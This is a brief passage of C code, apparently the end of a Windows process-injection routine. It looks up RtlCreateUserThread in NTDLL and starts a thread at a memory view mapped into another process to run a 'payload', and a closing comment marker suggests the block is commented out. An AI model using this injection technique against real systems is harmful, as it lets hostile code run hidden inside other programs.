	//printf("wait: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
	//getchar();

	// execute the payload
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}

*/